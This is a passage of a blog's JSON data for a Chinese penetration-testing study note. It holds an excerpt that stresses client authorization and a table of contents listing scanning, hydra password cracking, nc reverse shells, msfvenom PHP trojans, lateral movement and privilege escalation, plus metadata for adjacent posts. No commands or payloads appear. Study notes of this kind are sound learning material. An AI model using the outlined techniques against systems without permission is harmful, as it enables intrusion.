d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://blog.csdn.net/qq_38612882/article/details/122772867\">https://blog.csdn.net/qq_38612882/article/details/122772867</a></p>\n<p><a href=\"https://www.cnblogs.com/HelloCTF/p/12803808.html\">https://www.cnblogs.com/HelloCTF/p/12803808.html</a></p>\n<p><a href=\"https://blog.csdn.net/G_Fu_Q/article/details/116276096\">https://blog.csdn.net/G_Fu_Q/article/details/116276096</a></p></blockquote>\n","feature":true,"text":"渗透测试流程心得总结因为渗透测试过程非常复杂且涉及到的知识点极多，为了防止自己遗忘同时方便快速查阅，将渗透测试全流程以及其中涉及到的各种知识总结下来 1.确定目标确定你要渗透的目标，这里的前提是我们得经过用户的授权，才可以对网站进行渗透。不然如果我们没有经过客户的授权而对一个网站...","link":"","photos":[],"count_time":{"symbolsCount":"23k","symbolsTime":"21 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":9,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":3,"path":"api/tags/渗透测试.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E5%BF%83%E5%BE%97%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">渗透测试流程心得总结</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-%E7%A1%AE%E5%AE%9A%E7%9B%AE%E6%A0%87\"><span class=\"toc-text\">1.确定目标</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E7%81%B5%E9%AD%82%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%89\"><span class=\"toc-text\">2.信息收集（灵魂！！！）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\"><span class=\"toc-text\">网站信息收集</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8F%91%E7%8E%B0%E6%B4%BB%E5%8A%A8%E4%B8%BB%E6%9C%BA\"><span class=\"toc-text\">发现活动主机</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#arp-scan\"><span class=\"toc-text\">arp-scan</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#nmap\"><span class=\"toc-text\">nmap</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#netdiscover\"><span class=\"toc-text\">netdiscover</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B\"><span class=\"toc-text\">端口探测</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#masscan\"><span class=\"toc-text\">masscan</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#nmap-1\"><span class=\"toc-text\">nmap</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB\"><span class=\"toc-text\">指纹识别</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#whatweb\"><span class=\"toc-text\">whatweb</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F\"><span class=\"toc-text\">目录扫描</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#dirb\"><span class=\"toc-text\">dirb</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#nikto\"><span class=\"toc-text\">nikto</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#nmap-2\"><span class=\"toc-text\">nmap</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#dirbuster\"><span class=\"toc-text\">dirbuster</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#dirsearch\"><span class=\"toc-text\">dirsearch</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%A1%B5%E9%9D%A2%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B\"><span class=\"toc-text\">页面信息探测</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Wappalyzer\"><span class=\"toc-text\">Wappalyzer</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#cewl\"><span class=\"toc-text\">cewl</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#wpscan\"><span class=\"toc-text\">wpscan</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\"><span class=\"toc-text\">主机信息收集</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7\"><span class=\"toc-text\">查看当前用户</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">查看内核版本信息</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E8%B4%A6%E6%88%B7%E4%BF%A1%E6%81%AF%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">查看账户信息文件</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%94%B6%E9%9B%86%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">收集用户信息</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E6%9F%90%E4%B8%AA%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8\"><span class=\"toc-text\">查看某个系统命令是否存在</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E6%89%BESUID%E4%BD%8D%E7%9A%84%E7%A8%8B%E5%BA%8F\"><span class=\"toc-text\">查找SUID位的程序</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B\"><span class=\"toc-text\">3.漏洞探测</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%BC%B1%E5%8F%A3%E4%BB%A4\"><span class=\"toc-text\">弱口令</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AB%AF%E5%8F%A3%E6%95%B2%E9%97%A8\"><span class=\"toc-text\">端口敲门</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4-%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%EF%BC%88%E5%88%A9%E7%94%A8%EF%BC%89\"><span class=\"toc-text\">4.漏洞验证（利用）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4\"><span class=\"toc-text\">弱口令爆破</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#kali%E8%87%AA%E5%B8%A6%E5%AD%97%E5%85%B8\"><span class=\"toc-text\">kali自带字典</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#dirb-1\"><span class=\"toc-text\">dirb</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#dirbuster-1\"><span class=\"toc-text\">dirbuster</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#hydra\"><span class=\"toc-text\">hydra</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%A0%B4%E8%A7%A3ssh\"><span class=\"toc-text\">破解ssh</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#http%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3\"><span class=\"toc-text\">http协议破解</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#https%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3\"><span class=\"toc-text\">https协议破解</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#http-proxy%E5%8D%8F%E8%AE%AE%E7%A0%B4%E8%A7%A3\"><span class=\"toc-text\">http-proxy协议破解</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3\"><span class=\"toc-text\">密码破解</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#hash-identifier\"><span class=\"toc-text\">hash-identifier</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#john\"><span class=\"toc-text\">john</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">反弹shell</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8nc\"><span class=\"toc-text\">利用nc</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8msfvenom%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC\"><span class=\"toc-text\">利用msfvenom生成木马</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%94%9F%E6%88%90php%E6%9C%A8%E9%A9%AC\"><span class=\"toc-text\">生成php木马</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8\"><span class=\"toc-text\">横向移动</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\"><span class=\"toc-text\">1.信息收集</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E9%92%88%E5%AF%B9%E7%94%A8%E6%88%B7%E5%88%B6%E4%BD%9C%E5%AD%97%E5%85%B8\"><span class=\"toc-text\">2.针对用户制作字典</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-%E5%B0%9D%E8%AF%95%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA\"><span class=\"toc-text\">3.尝试使用工具破解远程主机</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4-ssh%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95\"><span class=\"toc-text\">4.ssh远程登录</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#5-%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">5.提权</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81\"><span class=\"toc-text\">5.权限维持</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#rbash%E9%80%83%E9%80%B8\"><span class=\"toc-text\">rbash逃逸</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#6-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87\"><span class=\"toc-text\">6.权限提升</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%89%8D%E6%9C%9F%E5%B7%A5%E4%BD%9C\"><span class=\"toc-text\">前期工作</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%94%B6%E9%9B%86%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">收集漏洞</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E8%87%AA%E5%B7%B1%E7%9A%84sudo%E6%8E%88%E6%9D%83%E5%88%97%E8%A1%A8\"><span class=\"toc-text\">查看自己的sudo授权列表</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%B0%9D%E8%AF%95%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7\"><span class=\"toc-text\">尝试切换用户</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#teehee%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">teehee提权</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#git%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">git提权</span></a></li></ol></li></ol></li></ol>","author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/Face.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"PHP编程与开发","uid":"20917cafe9bad9b66ec14a8de4e80fe8","slug":"PHP编程与开发","date":"2023-02-01T02:09:04.026Z","updated":"2023-02-01T02:08:35.170Z","comments":true,"path":"api/articles/PHP编程与开发.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/wallhaven-vq9kjl.png","text":"PHP基本使用PHP基础PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言 PHP 是什么？ PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。 PHP 脚本在服务器上执行。 PHP 可免费下载使用。...","link":"","photos":[],"count_time":{"symbolsCount":"28k","symbolsTime":"26 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":9,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"php","slug":"php","count":4,"path":"api/tags/php.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/Face.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"渗透测试工具-sqlmap详解","uid":"a6aaa0ab5b2e8cb7c48d0382e4a8493d","slug":"sqlmap详解","date":"2023-01-13T03:16:07.165Z","updated":"2023-02-01T03:55:28.117Z","comments":true,"path":"api/articles/sqlmap详解.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/wallhaven-496wr8.jpg","text":"谈到渗透测试就离不开sql注入，谈到sql注入就离不开sqlmap，本文旨在介绍sqlmap这款强大的自动化sql注入工具的使用，未来也会根据自己实际遇到的情况进行更新，话不多说，直接开整 sqlmap介绍其实对于sqlmap这款工具不需要过多介绍了，网上一搜一大把，这里还是简单...","link":"","photos":[],"count_time":{"symbolsCount":"9.5k","symbolsTime":"9 mins."},"categories":[{"name":"渗透从入门到入土","slug":"渗透从入门到入土","count":9,"path":"api/categories/渗透从入门到入土.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":3,"path":"api/tags/渗透测试.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/Face.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}}}